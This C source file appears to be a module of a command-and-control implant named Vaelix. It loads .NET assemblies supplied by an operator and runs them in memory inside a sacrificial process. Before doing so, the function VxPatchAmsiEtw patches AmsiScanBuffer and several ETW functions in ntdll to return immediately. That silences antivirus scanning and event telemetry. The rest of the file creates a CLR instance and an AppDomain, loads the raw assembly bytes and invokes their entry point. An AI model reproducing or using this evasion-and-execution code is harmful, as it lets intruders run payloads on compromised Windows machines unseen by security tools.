/*
 * Vaelix InvokeAssembly — sacrificial-process CLR host for JobDllSpawn.
 * InvokeAssembly: AMSI/ETW patch, GetParameters-aware invoke, AddBytes-safe
 * assembly length, no Instance.printf dependency for the hot path.
 */
#include <InvokeAssembly.h>
#include <shellapi.h>
#include <string.h>

GUID xCLSID_CLRMetaHost    = { 0x9280188d, 0xe8e, 0x4867, { 0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

static void vx_log(const char *msg)
{
    if (Instance.Win32.printf)
        Instance.Win32.printf("%s\n", msg);
}

/* xor eax,eax; ret — process-wide AMSI/ETW mute for the sacrificial host. */
static int patch_fn(void *addr)
{
    if (!addr) return -1;
    DWORD old = 0;
    if (!VirtualProtect(addr, 16, PAGE_EXECUTE_READWRITE, &old)) return -1;
    unsigned char *p = (unsigned char *)addr;
    p[0] = 0x33;
    p[1] = 0xC0;
    p[2] = 0xC3;
    VirtualProtect(addr, 16, old, &old);
    return 0;
}

static void *mod_proc(const char *mod, const char *name)
{
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    if (!h) return NULL;
    return (void *)GetProcAddress(h, name);
}

VOID VxPatchAmsiEtw(void)
{
    patch_fn(mod_proc("amsi.dll", "AmsiScanBuffer"));
    patch_fn(mod_proc("ntdll.dll", "EtwEventWrite"));
    patch_fn(mod_proc("ntdll.dll", "EtwEventWriteFull"));
    patch_fn(mod_proc("ntdll.dll", "NtTraceEvent"));
    patch_fn(mod_proc("ntdll.dll", "EtwNotificationRegister"));
}

static BOOL find_v4(PVOID assembly, INT length)
{
    static const char v4[] = "v4.0.30319";
    PCHAR p = (PCHAR)assembly;
    for (INT i = 0; i + 10 <= length; i++) {
        INT j;
        for (j = 0; j < 10; j++) {
            if (p[i + j] != v4[j]) break;
        }
        if (j == 10) return TRUE;
    }
    return FALSE;
}

static SAFEARRAY *build_string_args(LPCWSTR cmdline)
{
    int argc = 0;
    LPWSTR *argv = NULL;
    LPWSTR *base = NULL;
    if (cmdline && cmdline[0]) {
        size_t len = wcslen(cmdline);
        wchar_t *cmd = (wchar_t *)LocalAlloc(LPTR, (len + 8) * sizeof(wchar_t));
        if (!cmd) return NULL;
        wcscpy(cmd, L"x ");
        wcscat(cmd, cmdline);
        base = CommandLineToArgvW(cmd, &argc);
        LocalFree(cmd);
        if (base && argc > 0) {
            argv = base + 1;
            argc--;
        }
    }
    SAFEARRAY *psa = SafeArrayCreateVector(VT_BSTR, 0, argc > 0 ? (ULONG)argc : 0);
    if (!psa) {
        if (base) LocalFree(base);
        return NULL;
    }
    for (LONG i = 0; i < argc; i++) {
        BSTR b = SysAllocString(argv[i]);
        SafeArrayPutElement(psa, &i, b);
        SysFreeString(b);
    }
    if (base) LocalFree(base);
    return psa;
}

static HRESULT invoke_entry(Assembly *pAssembly, LPCWSTR wArguments)
{
    MethodInfo *mi = NULL;
    HRESULT hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &mi);
    if (FAILED(hr) || !mi) return FAILED(hr) ? hr : E_FAIL;

    VARIANT obj, ret;
    VariantInit(&obj);
    VariantInit(&ret);
    obj.vt = VT_NULL;

    SAFEARRAY *paramsInfo = NULL;
    LONG nParams = 0;
    if (SUCCEEDED(mi->lpVtbl->GetParameters(mi, &paramsInfo)) && paramsInfo) {
        LONG ub = -1;
        if (SUCCEEDED(SafeArrayGetUBound(paramsInfo, 1, &ub))) nParams = ub + 1;
        SafeArrayDestroy(paramsInfo);
    }

    SAFEARRAY *invokeArgs = NULL;
    if (nParams == 0) {
        invokeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
    } else {
        SAFEARRAY *strArgs = build_string_args(wArguments);
        if (!strArgs) {
            mi->lpVtbl->Release(mi);
            return E_OUTOFMEMORY;
        }
        VARIANT vtPsa;
        VariantInit(&vtPsa);
        vtPsa.vt = (VARTYPE)(VT_ARRAY | VT_BSTR);
        vtPsa.parray = strArgs;
        invokeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        LONG idx = 0;
        SafeArrayPutElement(invokeArgs, &idx, &vtPsa);
        VariantClear(&vtPsa);
    }

    hr = mi->lpVtbl->Invoke_3(mi, obj, invokeArgs, &ret);
    if (invokeArgs) SafeArrayDestroy(invokeArgs);
    VariantClear(&ret);
    mi->lpVtbl->Release(mi);
    return hr;
}

VOID InvokeAssembly(PPARSER DataArgs)
{
    INT AppDomainNameSize = 0;
    INT NetVersionSize = 0;
    INT assemblyBytesLen = 0;
    INT ArgumentsLen = 0;

    PUCHAR AppDomainName = (PUCHAR)ParserGetBytes(DataArgs, &AppDomainNameSize);
    PUCHAR NetVersion = (PUCHAR)ParserGetBytes(DataArgs, &NetVersionSize);
    PUCHAR assemblyBytes = (PUCHAR)ParserGetBytes(DataArgs, &assemblyBytesLen);
    PUCHAR Arguments = (PUCHAR)ParserGetBytes(DataArgs, &ArgumentsLen);

    WCHAR wAppDomainName[MAX_PATH] = { 0 };
    WCHAR wNetVersion[32] = { 0 };
    PWCHAR wArguments = NULL;

    ICLRMetaHost *pClrMetaHost = NULL;
    ICLRRuntimeInfo *pClrRuntimeInfo = NULL;
    ICorRuntimeHost *pICorRuntimeHost = NULL;
    Assembly *pAssembly = NULL;
    IUnknown *pAppDomainThunk = NULL;
    AppDomain *pAppDomain = NULL;
    SAFEARRAY *pSafeArray = NULL;
    LPVOID pvData = NULL;

    if (!assemblyBytes || assemblyBytesLen < 64) {
        vx_log("[-] empty assembly");
        return;
    }

    /* Legacy AddStr packed a trailing NUL into the length — trim it. */
    if (assemblyBytesLen > 0 && assemblyBytes[assemblyBytesLen - 1] == 0)
        assemblyBytesLen--;

    VxPatchAmsiEtw();

    if (AppDomainName && AppDomainNameSize > 0)
        CharStringToWCharString(wAppDomainName, (PCHAR)AppDomainName, MAX_PATH);
    else
        wcscpy(wAppDomainName, L"VaelixAppDomain");

    if (NetVersion && NetVersionSize > 0)
        CharStringToWCharString(wNetVersion, (PCHAR)NetVersion, 32);
    else if (find_v4(assemblyBytes, assemblyBytesLen))
        wcscpy(wNetVersion, L"v4.0.30319");
    else
        wcscpy(wNetVersion, L"v4.0.30319");

    if (Arguments && ArgumentsLen > 0) {
        wArguments = (PWCHAR)LocalAlloc(LPTR, (SIZE_T)ArgumentsLen * sizeof(WCHAR));
        if (wArguments)
            CharStringToWCharString(wArguments, (PCHAR)Arguments, ArgumentsLen);
    }

    if (!W32CreateClrInstance(wNetVersion, &pClrMetaHost, &pClrRuntimeInfo, &pICorRuntimeHost)) {
        vx_log("[-] Couldn't start CLR");
        goto Cleanup;
    }

    SAFEARRAYBOUND bound;
    bound.lLbound = 0;
    bound.cElements = (ULONG)assemblyBytesLen;
    pSafeArray = SafeArrayCreate(VT_UI1, 1, &bound);
    if (!pSafeArray) goto Cleanup;

    if (pICorRuntimeHost->lpVtbl->CreateDomain(pICorRuntimeHost, wAppDomainName, NULL, &pAppDomainThunk) != S_OK)
        goto Cleanup;
    if (pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &xIID_AppDomain, (void **)&pAppDomain) != S_OK)
        goto Cleanup;
    if (SafeArrayAccessData(pSafeArray, &pvData) != S_OK)
        goto Cleanup;
    memcpy(pvData, assemblyBytes, (size_t)assemblyBytesLen);
    SafeArrayUnaccessData(pSafeArray);

    if (pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly) != S_OK) {
        vx_log("[-] Load_3 failed");
        goto Cleanup;
    }

    {
        HRESULT hr = invoke_entry(pAssembly, wArguments);
        if (FAILED(hr))
            vx_log("[-] Invoke failed");
    }

Cleanup:
    if (pSafeArray) SafeArrayDestroy(pSafeArray);
    if (pAssembly) pAssembly->lpVtbl->Release(pAssembly);
    if (pAppDomain) pAppDomain->lpVtbl->Release(pAppDomain);
    if (pAppDomainThunk) {
        if (pICorRuntimeHost)
            pICorRuntimeHost->lpVtbl->UnloadDomain(pICorRuntimeHost, pAppDomainThunk);
        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
    }
    /* Do not Stop() — ExitProcess follows; Stop can tear down shared runtimes oddly. */
    if (pClrRuntimeInfo) pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
    if (pClrMetaHost) pClrMetaHost->lpVtbl->Release(pClrMetaHost);
    if (pICorRuntimeHost) pICorRuntimeHost->lpVtbl->Release(pICorRuntimeHost);
    if (wArguments) LocalFree(wArguments);
}

BOOL W32CreateClrInstance(LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost,
                          PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost)
{
    BOOL fLoadable = FALSE;

    if (!Instance.Win32.CLRCreateInstance) {
        vx_log("[-] CLRCreateInstance unresolved");
        return FALSE;
    }

    if (Instance.Win32.CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID *)ppClrMetaHost) != S_OK)
        return FALSE;
    if ((*ppClrMetaHost)->lpVtbl->GetRuntime(*ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID *)ppClrRuntimeInfo) != S_OK)
        return FALSE;
    if ((*ppClrRuntimeInfo)->lpVtbl->IsLoadable(*ppClrRuntimeInfo, &fLoadable) != S_OK || !fLoadable)
        return FALSE;
    if ((*ppClrRuntimeInfo)->lpVtbl->GetInterface(*ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID *)ppICorRuntimeHost) != S_OK)
        return FALSE;
    (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
    return TRUE;
}
